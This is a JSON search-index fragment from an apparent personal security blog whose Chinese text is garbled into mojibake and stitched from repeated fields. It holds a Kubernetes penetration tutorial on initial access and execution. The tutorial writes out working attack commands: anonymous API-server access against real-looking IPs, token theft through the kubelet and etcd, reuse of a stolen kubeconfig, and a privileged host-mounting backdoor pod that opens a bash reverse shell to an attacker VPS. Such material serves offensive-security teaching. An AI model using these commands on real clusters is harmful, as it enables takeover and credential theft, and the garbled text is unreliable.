å³6443å®‰å…¨ç«¯å£çš„æœªæˆæƒè®¿é—®\nè‹¥æˆ‘ä»¬ä¸å¸¦ä»»ä½•å‡­è¯çš„è®¿é—® API serverçš„ secure-portç«¯å£ï¼Œé»˜è®¤ä¼šè¢«æœåŠ¡å™¨æ ‡è®°ä¸ºsystem:anonymousç”¨æˆ·ã€‚\nä¸€èˆ¬æ¥è¯´system:anonymousç”¨æˆ·æƒé™æ˜¯å¾ˆä½çš„ï¼Œä½†æ˜¯å¦‚æœè¿ç»´äººå‘˜ç®¡ç†å¤±å½“ï¼ŒæŠŠsystem:anonymousç”¨æˆ·ç»‘å®šåˆ°äº†cluster-adminç”¨æˆ·ç»„ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€secure-portå…è®¸åŒ¿åç”¨æˆ·ä»¥ç®¡ç†å‘˜æƒé™å‘é›†ç¾¤ä¸‹è¾¾å‘½ä»¤ï¼Œè¿™ä¹Ÿç®—æ˜¯å˜å‘çš„æœªæˆæƒäº†:\næˆ‘ä»¬å¯ä»¥é€šè¿‡kubectlè¿›è¡Œapiserverè°ƒç”¨ï¼š\nkubectl -s https://112.126.76.224:6443 --insecure-skip-tls-verify=true cluster-info å½“ç„¶æœ‰å¯èƒ½ä¼šé‡åˆ°è¿™ç§æƒ…å†µï¼š\nè¿™ç§æ—¶å€™å¯ä»¥ä½¿ç”¨æµè§ˆå™¨curlå»è¯·æ±‚apiæ¥å£æŸ¥çœ‹å“åº”çš„jsonéƒ½èƒ½è¾¾åˆ°ç±»ä¼¼æ•ˆæœï¼š\nå½“ç„¶æœ‰ä¸ªå¾ˆå¥½ç”¨çš„å·¥å…·å«cdkä¹Ÿå¯ä»¥å®ç°ï¼Œæœ‰ä¸ªkcurlå‚æ•°åŠŸèƒ½æ˜¯è¿æ¥K8s api-serverå‘èµ·è‡ªå®šä¹‰HTTPè¯·æ±‚ï¼š\nåœ¨åŒ¿åç”¨æˆ·å¯ä»¥æœªæˆæƒè®¿é—®6443ç«¯å£çš„æƒ…å†µï¼Œï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è®¿é—®/api/v1/namespaces/default/secretè·¯ç”±æ¥å°è¯•è·å–ç”¨æˆ·tokenï¼š\næˆ‘ä»¬å°†è¿™é‡Œçš„tokenå­—æ®µè¿›è¡Œbase64è§£ç åå¯ä»¥åˆ°åˆ°kubectlçš„6443å®‰å…¨ç«¯å£è¿›è¡Œæ“ä½œï¼Œæ¯”å¦‚è·å–å½“å‰çš„æƒé™ï¼š\nkubectl auth can-i --list --server=https://119.8.60.88:6443 --token=\u0026#34;\u0026lt;tokenå€¼\u0026gt;\u0026#34; --insecure-skip-tls-verify è¿™é‡Œå¯ä»¥çœ‹åˆ°æƒé™éå¸¸é«˜\næ‰“æ³•å’Œä¸å®‰å…¨ç«¯å£8080æœªæˆæƒç±»ä¼¼ï¼Œè¿™é‡Œä¸å†ç»†è¯´\nkubectl proxyæš´éœ² é€šè¿‡åå‘ä»£ç†ç­‰æ–¹å¼è¿›è¡Œç«¯å£è½¬å‘å°†åŸæœ¬å†…ç½‘çš„æœªæˆæƒapi serveræš´éœ²åˆ°å…¬ç½‘\næ‰€ä»¥åˆ©ç”¨æ–¹å¼å’Œapiserveræœªæˆæƒç±»ä¼¼ï¼Œè¿™é‡Œä¸å†ç»†è¯´\nkubeletæœªæˆæƒ kubeletå’Œkubectlçš„åŒºåˆ«ï¼Ÿ\nkubeletæ˜¯åœ¨Nodeä¸Šç”¨äºç®¡ç†æœ¬æœºPodçš„ï¼Œkubectlæ˜¯ç”¨äºç®¡ç†é›†ç¾¤çš„ã€‚kubectlå‘é›†ç¾¤ä¸‹è¾¾æŒ‡ä»¤ï¼ŒNodeä¸Šçš„kubeletæ”¶åˆ°æŒ‡ä»¤åä»¥æ­¤æ¥ç®¡ç†æœ¬æœºPod\næ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ªkubeletæœåŠ¡ï¼Œkubeletæ˜¯åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œçš„ä¸»è¦èŠ‚ç‚¹ä»£ç†ï¼Œç›‘å¬äº†10250ã€10248ã€10255ç­‰ç«¯å£ï¼Œè´Ÿè´£ç®¡ç†èŠ‚ç‚¹ä¸Šçš„å®¹å™¨ä¸masterèŠ‚ç‚¹çš„é€šä¿¡ï¼Œè€Œ10250ç«¯å£å°±æ˜¯kubeletä¸API Serverè¿›è¡Œé€šä¿¡çš„ä¸»è¦ç«¯å£\nå¦‚æœkubeconfigæ–‡ä»¶ä¸­çš„é…ç½®ä¸å½“ï¼Œåˆ™ä¼šå¯¼è‡´ç³»ç»Ÿå­˜åœ¨kubeletæœªæˆæƒè®¿é—®ï¼Œåœ¨è¯¥æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…èƒ½å¤Ÿåˆ—å‡ºå½“å‰è¿è¡Œçš„podï¼Œå¯¹ä»»æ„podæ‰§è¡Œå‘½ä»¤ç­‰ï¼Œå®ç°è¿›ä¸€æ­¥çš„åˆ©ç”¨\nä¾‹å¦‚å¯¹æœåŠ¡è´¦å·ç»‘å®šäº†cluster-adminæƒé™çš„podæ‰§è¡Œå‘½ä»¤æ¥è¯»å–æœåŠ¡è´¦å·çš„tokenï¼Œç„¶ååˆ©ç”¨é«˜æƒé™tokenæ§åˆ¶apiserverï¼Œåˆ›å»ºæ¶æ„podå¹¶é€ƒé€¸\né€šè¿‡è¯·æ±‚æ¥å£æ‰§è¡Œå‘½ä»¤è¯»å–tokenï¼š\ncurl -XPOST -k \u0026#34;https://${K8S}:10250/run/\u0026lt;namespace\u0026gt;/\u0026lt;pod\u0026gt;/\u0026lt;container\u0026gt;\u0026#34; -d \u0026#34;cmd=cat /var/run/secret/kubernetes.io/serviceaccount/token\u0026#34; etcdæœªæˆæƒ k8sä½¿ç”¨etcdå­˜å‚¨æ•°æ®ï¼Œé»˜è®¤ç›‘å¬2379ç«¯å£ï¼Œå¦‚æœè¯¥ç«¯å£æš´éœ²åˆ°å…¬ç½‘ä¸”å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œå°±å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„æ¼ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ”¶é›†åˆ°çš„å‡­è¯æ¥å°è¯•æ¥ç®¡é›†ç¾¤ï¼Œè€Œç”±äºæœ¬æœºå¯å…è®¤è¯è®¿é—®2379ç«¯å£ï¼Œæ‰€ä»¥å¯ä»¥ç»“åˆSSRFæ¥æ‰“ç»„åˆæ‹³\netcdåˆ†ä¸ºv2å’Œv3ä¸¤ä¸ªå¤§ç‰ˆæœ¬ï¼Œæ‰“æ³•ä¹Ÿå„ä¸ç›¸åŒï¼š\netcd v2 Kubernetes â‰¤ 1.5çš„ç‰ˆæœ¬é»˜è®¤ä½¿ç”¨etcd v2ï¼Œæ‰“æ³•ä¸€èˆ¬æ˜¯ç›´æ¥é€šè¿‡ç½‘é¡µè®¿é—®æ¥è·å–key-valueçš„ä¿¡æ¯ï¼š\nhttp://127.0.0.1:2379/v2/keys/?recursive=true ä½†æ„Ÿè§‰å¾ˆå°‘é‡åˆ°æœ‰ç”¨çš„ä¿¡æ¯ï¼š\netcd v3 ä»k8s v1.6 å¼€å§‹ï¼Œå°±é»˜è®¤ä½¿ç”¨ etcd v3ï¼Œä¸€èˆ¬ä½¿ç”¨etcdctlå®ç°å¯¹etcdçš„è®¿é—®\næ¯”å¦‚è¿™é‡Œæˆ‘ä»¬å°è¯•è¯»å–etcdä¸­å­˜å‚¨çš„ç›¸å…³ä¿¡æ¯ï¼š\n./etcdctl --endpoints=x.x.x.x:2379 get / --prefix --keys-only æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡åŒ¹é…secretså…³é”®å­—æ¥å¯»æ‰¾tokenç›¸å…³ä¿¡æ¯ï¼š\n./etcdctl --endpoints=x.x.x.x:2379 get / --prefix --keys-only | grep /secrets/ å¯ä»¥çœ‹åˆ°è¿™é‡Œå°±æœ‰å¾ˆå¤štokenä¿¡æ¯\næ¯”å¦‚æˆ‘ä»¬è¯»å–bootstrap-tokenï¼š\nè·å¾—tokenåï¼Œæˆ‘ä»¬å¯ä»¥åœ¨APIserveræŸ¥çœ‹å½“å‰tokenæƒé™ï¼š\n./etcdctl --token=\u0026lt;token\u0026gt; --server=x.x.x.x:6443 --insecure-skip-tls-verify auth can-i --list å¯è§è¿™é‡Œè¿™ä¸ªbootstrap-tokençš„æƒé™å°±æ¯”è¾ƒä½\nkubeconfigæ–‡ä»¶æ³„æ¼ kubeconfigæ–‡ä»¶æ˜¯ç”¨äºé…åˆ¶é›†ç¾¤è®¿é—®çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ç”¨æ¥ç»„ç»‡æœ‰å…³é›†ç¾¤ã€ç”¨æˆ·ã€å‘½åç©ºé—´å’Œèº«ä»½è®¤è¯æœºåˆ¶çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬é›†ç¾¤çš„apiserveråœ°å€å’Œç™»å½•å‡­è¯ï¼Œå¦‚æœæ”»å‡»è€…è·å–åˆ°è¯¥æ–‡ä»¶ï¼Œå°±å¯ä»¥ä½¿ç”¨è¯¥å‡­è¯è®¿é—®k8sé›†ç¾¤\næ¯”å¦‚nodeèŠ‚ç‚¹ä¸Šå°±å­˜å‚¨äº†kubeconfigæ–‡ä»¶ï¼š\ncat /root/.kube/config # æˆ– cat /etc/kubernetes/kubelet.conf æˆ‘ä»¬å¯ä»¥å°†configå¤åˆ¶åˆ°æˆ‘ä»¬è‡ªå·±çš„vpsä¸Šï¼Œå¹¶ä¸”æŠŠè¿™ä¸ªconfigä¸­serverçš„å€¼ä»æœ¬åœ°urlæ”¹ä¸ºå¤–ç½‘åœ°å€ï¼š æ¥ä¸‹æ¥å¯ä»¥é€šè¿‡kubectæŒ‡å®šconfigæ–‡ä»¶æ¥æ§åˆ¶apiserveräº†ï¼š\nkubectl --kubeconfig config get pods K8s Dashboard æœªæˆæƒ k8s Dashboardæ˜¯ä¸€ä¸ªåŸºäºwebçš„k8sç”¨æˆ·ç•Œé¢ï¼Œå¯ä»¥å¯¹k8sè¿›è¡Œå¯è§†åŒ–ç®¡ç†\næ­£å¸¸çš„k8sé¢æ¿åº”è¯¥åƒè¿™æ ·ï¼Œåªå…è®¸ä½¿ç”¨bearer tokenç™»å½•ï¼š æˆ–è€…è¿˜å…è®¸ä½¿ç”¨kubeconfigæ–‡ä»¶ç™»å½•ï¼š\nä½†å¦‚æœç”¨æˆ·é…ç½®é”™è¯¯ï¼Œä¼šå¯¼è‡´å¯ä»¥è·³è¿‡è®¤è¯é˜¶æ®µï¼š\nåªéœ€è¦ç‚¹å‡»è·³è¿‡ï¼Œå°±èƒ½å¤Ÿè¿›å…¥dashboardçš„ç®¡ç†ç•Œé¢ï¼š\nä½†æˆ‘ä»¬è¿™æ ·ä½¿ç”¨çš„å…¶å®æ˜¯dashboardé»˜è®¤æœåŠ¡è´¦æˆ·ï¼š\nè¯¥è´¦æˆ·åœ¨é»˜è®¤æƒ…å†µä¸‹ä¹Ÿä¸èƒ½è¾¾åˆ°æ§åˆ¶é›†ç¾¤çš„ç›®çš„ï¼Œä½†æœ‰äº›å¼€å‘è€…ä¼šä¸ºäº†æ–¹ä¾¿ï¼Œå°†kubernets-dashboardè´¦å·ç»‘å®šcluster-adminé›†ç¾¤ç®¡ç†å‘˜è§’è‰²ï¼Œå°±è¿™æ ·å°±ä¼šä½¿å…¶æ‹¥æœ‰é›†ç¾¤æœ€é«˜æƒé™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åˆ›å»ºæ¶æ„podæ¥ä¸€æ­¥æ­¥æ¥ç®¡é›†ç¾¤ï¼š\næ€»ç»“ å¯ä»¥çœ‹å‡ºï¼Œå…¶å®åˆå§‹è®¿é—®çš„å…¥å£éƒ½æ˜¯é…ç½®ä¸å½“å¯¼è‡´çš„æœªæˆæƒï¼Œè¿™äº›æœªæˆæƒå­˜åœ¨äºå„ä¸ªä¸åŒçš„ç«¯å£ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯¹è¿™äº›ç«¯å£å¤šåŠ ç•™æ„\n",
        "summary": "K8sæ¸—é€-åˆå§‹è®¿é—® æ–‡ç« é¦–å‘äºtrackå®‰å…¨ç¤¾åŒºï¼šK8sæ¸—é€å…¥é—¨ä»é›¶åˆ°ä¸€\nåˆå§‹è®¿é—®æ˜¯æ”»é˜²çŸ©é˜µçš„ç¬¬ä¸€æ­¥ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºè·å–å¯¹k8sçš„è®¿é—®æƒé™\nAPIServeræœªæˆæƒ insecure-portå¼€å¯ å…¸ä¸­å…¸çš„k8sç›¸å…³æ¼æ´ï¼ŒAPIServeråœ¨é›†ç¾¤ä¸­è¢«ç”¨äºæä¾›APIæ¥æ§åˆ¶é›†ç¾¤å†…éƒ¨ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶API Serverï¼Œå°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡å®ƒåˆ©ç”¨kubectlåˆ›å»ºPodå¹¶ä½¿ç”¨ç£ç›˜æŒ‚è½½æŠ€æœ¯è·å–NodeèŠ‚ç‚¹æ§åˆ¶æƒ\nå¦‚æœç›®æ ‡ä¸»æœºå°†APISevreréå®‰å…¨ç«¯å£8080æš´éœ²å‡ºæ¥ï¼Œä¾¿å¯ä»¥åˆ©ç”¨æ­¤ç«¯å£è¿›è¡Œå¯¹é›†ç¾¤çš„æ”»å‡»ï¼š\nç›´æ¥è®¿é—®8080ç«¯å£ï¼Œä¼šè¿”å›å¯ç”¨çš„APIåˆ—è¡¨ï¼š\næ¥ä¸‹æ¥éœ€è¦ç”¨åˆ°kubectlï¼Œå®‰è£…æ•™ç¨‹è§å®˜ç½‘\nä½¿ç”¨kubectlå¯ä»¥è·å–é›†ç¾¤ä¿¡æ¯ï¼š\nkubectl -s [ip]:[port] get nodes ä¸Šé¢è¿™ä¸ªæ¡ˆä¾‹å¯ä»¥çœ‹åˆ°æœ‰4ä¸ªèŠ‚ç‚¹ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªèŠ‚ç‚¹statusä¸ºreadyï¼Œå¯ä»¥æˆä¸ºåç»­æ‰§è¡Œé˜¶æ®µçš„å…¥å£ç‚¹ï¼Œæ¯”å¦‚åˆ©ç”¨kubectlè°ƒç”¨è¯¥apiserveræ¥åˆ›å»ºæ¶æ„pod\nsecure-portå¼€å¯åŒ¿åè®¿é—® å³6443å®‰å…¨ç«¯å£çš„æœªæˆæƒè®¿é—®\nè‹¥æˆ‘ä»¬ä¸å¸¦ä»»ä½•å‡­è¯çš„è®¿é—® API serverçš„ secure-portç«¯å£ï¼Œé»˜è®¤ä¼šè¢«æœåŠ¡å™¨æ ‡è®°ä¸ºsystem:anonymousç”¨æˆ·ã€‚\nä¸€èˆ¬æ¥è¯´system:anonymousç”¨æˆ·æƒé™æ˜¯å¾ˆä½çš„ï¼Œä½†æ˜¯å¦‚æœè¿ç»´äººå‘˜ç®¡ç†å¤±å½“ï¼ŒæŠŠsystem:anonymousç”¨æˆ·ç»‘å®šåˆ°äº†cluster-adminç”¨æˆ·ç»„ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€secure-portå…è®¸åŒ¿åç”¨æˆ·ä»¥ç®¡ç†å‘˜æƒé™å‘é›†ç¾¤ä¸‹è¾¾å‘½ä»¤ï¼Œè¿™ä¹Ÿç®—æ˜¯å˜å‘çš„æœªæˆæƒäº†:\næˆ‘ä»¬å¯ä»¥é€šè¿‡kubectlè¿›è¡Œapiserverè°ƒç”¨ï¼š\nkubectl -s https://112.126.76.224:6443 --insecure-skip-tls-verify=true cluster-info å½“ç„¶æœ‰å¯èƒ½ä¼šé‡åˆ°è¿™ç§æƒ…å†µï¼š\nè¿™ç§æ—¶å€™å¯ä»¥ä½¿ç”¨æµè§ˆå™¨curlå»è¯·æ±‚apiæ¥å£æŸ¥çœ‹å“åº”çš„jsonéƒ½èƒ½è¾¾åˆ°ç±»ä¼¼æ•ˆæœï¼š\nå½“ç„¶æœ‰ä¸ªå¾ˆå¥½ç”¨çš„å·¥å…·å«cdkä¹Ÿå¯ä»¥å®ç°ï¼Œæœ‰ä¸ªkcurlå‚æ•°åŠŸèƒ½æ˜¯è¿æ¥K8s api-serverå‘èµ·è‡ªå®šä¹‰HTTPè¯·æ±‚ï¼š\nåœ¨åŒ¿åç”¨æˆ·å¯ä»¥æœªæˆæƒè®¿é—®6443ç«¯å£çš„æƒ…å†µï¼Œï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è®¿é—®/api/v1/namespaces/default/secretè·¯ç”±æ¥å°è¯•è·å–ç”¨æˆ·tokenï¼š\næˆ‘ä»¬å°†è¿™é‡Œçš„tokenå­—æ®µè¿›è¡Œbase64è§£ç åå¯ä»¥åˆ°åˆ°kubectlçš„6443å®‰å…¨ç«¯å£è¿›è¡Œæ“ä½œï¼Œæ¯”å¦‚è·å–å½“å‰çš„æƒé™ï¼š\nkubectl auth can-i --list --server=https://119.8.60.88:6443 --token=\u0026#34;\u0026lt;tokenå€¼\u0026gt;\u0026#34; --insecure-skip-tls-verify è¿™é‡Œå¯ä»¥çœ‹åˆ°æƒé™éå¸¸é«˜\næ‰“æ³•å’Œä¸å®‰å…¨ç«¯å£8080æœªæˆæƒç±»ä¼¼ï¼Œè¿™é‡Œä¸å†ç»†è¯´\nkubectl proxyæš´éœ² é€šè¿‡åå‘ä»£ç†ç­‰æ–¹å¼è¿›è¡Œç«¯å£è½¬å‘å°†åŸæœ¬å†…ç½‘çš„æœªæˆæƒapi serveræš´éœ²åˆ°å…¬ç½‘\næ‰€ä»¥åˆ©ç”¨æ–¹å¼å’Œapiserveræœªæˆæƒç±»ä¼¼ï¼Œè¿™é‡Œä¸å†ç»†è¯´\nkubeletæœªæˆæƒ kubeletå’Œkubectlçš„åŒºåˆ«ï¼Ÿ\nkubeletæ˜¯åœ¨Nodeä¸Šç”¨äºç®¡ç†æœ¬æœºPodçš„ï¼Œkubectlæ˜¯ç”¨äºç®¡ç†é›†ç¾¤çš„ã€‚kubectlå‘é›†ç¾¤ä¸‹è¾¾æŒ‡ä»¤ï¼ŒNodeä¸Šçš„kubeletæ”¶åˆ°æŒ‡ä»¤åä»¥æ­¤æ¥ç®¡ç†æœ¬æœºPod\næ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ªkubeletæœåŠ¡ï¼Œkubeletæ˜¯åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œçš„ä¸»è¦èŠ‚ç‚¹ä»£ç†ï¼Œç›‘å¬äº†10250ã€10248ã€10255ç­‰ç«¯å£ï¼Œè´Ÿè´£ç®¡ç†èŠ‚ç‚¹ä¸Šçš„å®¹å™¨ä¸masterèŠ‚ç‚¹çš„é€šä¿¡ï¼Œè€Œ10250ç«¯å£å°±æ˜¯kubeletä¸API Serverè¿›è¡Œé€šä¿¡çš„ä¸»è¦ç«¯å£\nå¦‚æœkubeconfigæ–‡ä»¶ä¸­çš„é…ç½®ä¸å½“ï¼Œåˆ™ä¼šå¯¼è‡´ç³»ç»Ÿå­˜åœ¨kubeletæœªæˆæƒè®¿é—®ï¼Œåœ¨è¯¥æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…èƒ½å¤Ÿåˆ—å‡ºå½“å‰è¿è¡Œçš„podï¼Œå¯¹ä»»æ„podæ‰§è¡Œå‘½ä»¤ç­‰ï¼Œå®ç°è¿›ä¸€æ­¥çš„åˆ©ç”¨\nä¾‹å¦‚å¯¹æœåŠ¡è´¦å·ç»‘å®šäº†cluster-adminæƒé™çš„podæ‰§è¡Œå‘½ä»¤æ¥è¯»å–æœåŠ¡è´¦å·çš„tokenï¼Œç„¶ååˆ©ç”¨é«˜æƒé™tokenæ§åˆ¶apiserverï¼Œåˆ›å»ºæ¶æ„podå¹¶é€ƒé€¸\né€šè¿‡è¯·æ±‚æ¥å£æ‰§è¡Œå‘½ä»¤è¯»å–tokenï¼š\ncurl -XPOST -k \u0026#34;https://${K8S}:10250/run/\u0026lt;namespace\u0026gt;/\u0026lt;pod\u0026gt;/\u0026lt;container\u0026gt;\u0026#34; -d \u0026#34;cmd=cat /var/run/secret/kubernetes.io/serviceaccount/token\u0026#34; etcdæœªæˆæƒ k8sä½¿ç”¨etcdå­˜å‚¨æ•°æ®ï¼Œé»˜è®¤ç›‘å¬2379ç«¯å£ï¼Œå¦‚æœè¯¥ç«¯å£æš´éœ²åˆ°å…¬ç½‘ä¸”å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œå°±å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„æ¼ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ”¶é›†åˆ°çš„å‡­è¯æ¥å°è¯•æ¥ç®¡é›†ç¾¤ï¼Œè€Œç”±äºæœ¬æœºå¯å…è®¤è¯è®¿é—®2379ç«¯å£ï¼Œæ‰€ä»¥å¯ä»¥ç»“åˆSSRFæ¥æ‰“ç»„åˆæ‹³\n"
    }
,
    {
        "title": "K8sæ¸—é€-æ‰§è¡Œ",
        "link": "/My-Knowlege-Database/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%89%A7%E8%A1%8C/",
        "content": "K8sæ¸—é€-æ‰§è¡Œ æ–‡ç« é¦–å‘äºtrackå®‰å…¨ç¤¾åŒºï¼šK8sæ¸—é€å…¥é—¨ä»é›¶åˆ°ä¸€\næ‰§è¡Œé˜¶æ®µçš„ä¸»è¦ä»»åŠ¡æ˜¯å®ç°åœ¨é›†ç¾¤å†…æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œè·å¾—shell\nkubectl execè¿›å…¥å®¹å™¨ å½“æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶apiserveræ—¶ï¼Œå’Œdockerç±»ä¼¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤è¿›å…¥å®¹å™¨çš„shellä¸­æ‰§è¡Œå‘½ä»¤ï¼š\n# apiserveræœªæˆæƒæ—¶ kubectl -s x.x.x.x:8080 --namespace=default exec -it test-rev -- bash # è·å–åˆ°kubeconfigæ–‡ä»¶æ—¶ kubectl --kubeconfig config --namespace=default exec -it test-rev -- bash # è·å–åˆ°é«˜æƒé™tokenæ—¶ kubectl --server=https://x.x.x.x:6443 --token=\u0026#34;\u0026lt;tokenå€¼\u0026gt;\u0026#34; --insecure-skip-tls-verify --namespace=default exec -it test-rev -- bash æ¯”å¦‚è¿™é‡Œè¿›å…¥å®¹å™¨æ‰§è¡Œåå¼¹shellå‘½ä»¤\næˆåŠŸç›‘å¬åˆ°åå¼¹shellï¼š\nåˆ›å»ºåé—¨pod è·å–åˆå§‹è®¿é—®æƒé™åï¼Œé€šè¿‡åˆ›å»ºåé—¨podæ¥æ‰§è¡Œåç»­æ”»å‡»ï¼Œ\né¦–å…ˆæœ¬æœºä¸Šæ–°å»ºä¸ªyamlæ–‡ä»¶ç”¨äºåˆ›å»ºå®¹å™¨ï¼Œå°†èŠ‚ç‚¹çš„æ ¹ç›®å½•æŒ‚è½½åˆ°å®¹å™¨çš„ /mnt ç›®å½•ï¼Œå¹¶åœ¨å®¹å™¨å¯åŠ¨åè‡ªåŠ¨æ‰§è¡Œåå¼¹shellå‘½ä»¤ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\napiVersion: v1 kind: Pod metadata: name: test-rev spec: nodeName: \u0026lt;èŠ‚ç‚¹åç§°\u0026gt; containers: - name: test-container image: ubuntu command: [\u0026#34;/bin/sh\u0026#34;] args: - \u0026#34;-c\u0026#34; - | apt update \u0026amp;\u0026amp; apt install -y bash netcat-openbsd \u0026amp;\u0026amp; \\ bash -c \u0026#39;while true; do bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ä½ çš„vpsçš„å…¬ç½‘IP\u0026gt;/2333 0\u0026gt;\u0026amp;1; sleep 60; done\u0026#39; volumeMounts: - mountPath: /mnt name: test-volume securityContext: privileged: true volumes: - name: test-volume hostPath: path: / ç„¶åä½¿ç”¨ kubectl åˆ›å»ºæ–‡ä»¶æŒ‡å®šçš„æ¶æ„å®¹å™¨ï¼š\nkubectl -s x.x.x.x:8080 create -f test.yaml æ³¨æ„ï¼Œè¿™é‡Œå¦‚æœæƒ³è¦æŒ‡å®šåœ¨å“ªä¸ªnodeä¸Šåˆ›å»ºå®¹å™¨ï¼ˆåªæœ‰çŠ¶æ€ä¸ºreadyçš„nodeå¯ä»¥åˆ›å»ºå¹¶runningï¼‰ï¼Œå¯ä»¥ç›´æ¥åœ¨yamlä¸­å¢åŠ nodeNameå­—æ®µï¼š\nspec: nodeName: \u0026lt;èŠ‚ç‚¹åç§°\u0026gt; æˆ‘ä»¬å…¶å®ä¹Ÿå¯ä»¥é€šè¿‡ä¸Šé¢æåˆ°çš„kubectl execç›´æ¥è¿›å…¥å®¹å™¨çš„shellï¼š\nkubectl -s x.x.x.x:8080 --namespace=default exec -it test-rev -- bash åœ¨åˆ›å»ºæˆåŠŸåï¼Œå®¹å™¨ä¼šè‡ªåŠ¨å‘æˆ‘ä»¬ç›‘å¬çš„vpsåå¼¹shellï¼š\nå› ä¸ºæˆ‘ä»¬å°†èŠ‚ç‚¹çš„æ ¹ç›®å½•æŒ‚è½½åˆ°äº†å®¹å™¨çš„/mntç›®å½•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ“ä½œpodçš„/mntç›®å½•æ¥æ“ä½œnodeçš„æ ¹ç›®å½•ï¼š\næœåŠ¡è´¦å·è¿æ¥API Serveræ‰§è¡ŒæŒ‡ä»¤ k8sçš„è´¦å·åˆ†ä¸ºç”¨æˆ·è´¦å·å’ŒæœåŠ¡è´¦å·ï¼Œç”¨æˆ·è´¦å·æä¾›ç»™ç”¨æˆ·æ¥æ“ä½œé›†ç¾¤ï¼ŒæœåŠ¡è´¦å·ç”¨äºpodä¸­è¿è¡Œçš„è¿›ç¨‹ï¼Œä¸ºpodä¸­è¿è¡Œçš„åº”ç”¨æˆ–æœåŠ¡æä¾›èº«ä»½ï¼Œç”±k8s APIè‡ªåŠ¨åˆ›å»ºå¹¶ç”±API serverè¿›è¡Œè®¤è¯ï¼Œk8sçš„podä¸­é»˜è®¤æºå¸¦æœåŠ¡è´¦å·çš„è®¿é—®å‡­è¯ï¼Œæ¯ä¸ªæœåŠ¡è´¦å·å‡ä¼šè‡ªåŠ¨å…³è”ä¸€ä¸ªAPIè®¿é—®ä»¤ç‰Œï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ§åˆ¶çš„podä¸­å­˜åœ¨é«˜æƒé™çš„æœåŠ¡è´¦å·ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨podä¸­é€šè¿‡è¯¥è´¦å·å‡­è¯å‘k8sä¸‹å‘æŒ‡ä»¤\næœåŠ¡è´¦å·åœ¨podå†…çš„é»˜è®¤è·¯å¾„å¦‚ä¸‹ï¼š\n/var/run/secrets/kubernetes.io/serviceaccount/ æˆ‘ä»¬å¯ä»¥æºå¸¦è¿™é‡Œçš„tokenå‘apiserverå‘é€ä¸€ä¸ªSelfSubjectRulesReviewè¯·æ±‚ï¼Œå¯ä»¥çŸ¥é“å½“å‰æœåŠ¡è´¦å·åœ¨æŒ‡å®šå‘½åç©ºé—´ï¼ˆè¿™é‡Œä»¥defaultä¸ºä¾‹ï¼‰çš„æ“ä½œæƒé™ï¼š\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace) curl -sk --header \u0026#34;Authorization: Bearer $TOKEN\u0026#34; --cacert $CA_CERT -H \u0026#34;Content-Type: application/json\u0026#34; -X POST https://x.x.x.x:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -d \u0026#39;{\u0026#34;kind\u0026#34;:\u0026#34;SelfSubjectRulesReview\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;authorization.k8s.io/v1\u0026#34;,\u0026#34;spec\u0026#34;:{\u0026#34;namespace\u0026#34;:\u0026#34;default\u0026#34;}}\u0026#39; å¦‚æœè¿”å›çš„jsonä¸­åˆ—å‡ºæ¥æ˜¯è¾ƒé«˜çš„æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªæœåŠ¡è´¦æˆ·çš„tokenæ¥è¿œç¨‹æ§åˆ¶apiserverï¼ˆç½‘ä¼ å¯ä»¥curlè¯·æ±‚apiserverçš„å€Ÿå£æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æˆ‘å¤±è´¥äº†ï¼Œä¼¼ä¹æ˜¯å› ä¸ºè¿™é‡Œä¸èƒ½ä½¿ç”¨å¸¸è§„httpæ¥è¯·æ±‚å€Ÿå£ï¼Œè€Œéœ€è¦SPDYæˆ–è€…websocketï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºä½¿ç”¨kubectlæ¥å®Œæˆå¯¹kubectlçš„æ§åˆ¶æ›´æ–¹ä¾¿ï¼‰ï¼š\né‚£ä¹ˆåé¢çš„æ“ä½œå°±å’Œä¸Šæ–‡ä¸€æ ·ï¼Œå¯ä»¥åˆ›å»ºåé—¨podå¹¶æŒ‚è½½nodeæ 